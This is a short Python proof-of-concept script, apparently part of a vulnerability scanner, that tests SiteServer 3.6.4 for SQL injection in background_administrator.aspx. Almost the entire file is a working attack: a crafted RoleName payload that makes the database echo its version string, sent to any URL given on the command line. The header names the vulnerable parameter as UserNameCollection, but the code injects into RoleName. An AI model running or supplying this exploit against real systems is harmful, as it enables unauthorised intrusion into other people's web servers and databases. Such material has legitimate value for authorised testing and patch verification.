#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: siteserver3.6.4 background_administrator.aspx注入
referer: http://www.wooyun.org/bugs/wooyun-2013-043645
author: Lucifer
description: 文件/siteserver/userRole/background_administrator.aspx中,参数UserNameCollection存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class siteserver_background_administrator_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/userRole/background_administrator.aspx?RoleName=%27AnD%20ChAr(66)%2BChAr(66)%2BChAr(66)%2B@@VeRsIoN>0--&PageNum=0&Keyword=test&AreaID=0&LastActivityDate=0&Order=UserName"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"BBBMicrosoft" in req.text:
                cprint("[+]存在siteserver3.6.4 background_administrator.aspx注入漏洞...(高危)\tpayload: "+vulnurl, "red")
                return True, vulnurl, "siteserver3.6.4 background_administrator.aspx注入", str(payload), req.text
            else:
                cprint("[-]不存在siteserver_background_administrator_sqli漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = siteserver_background_administrator_sqli_BaseVerify(sys.argv[1])
    testVuln.run()
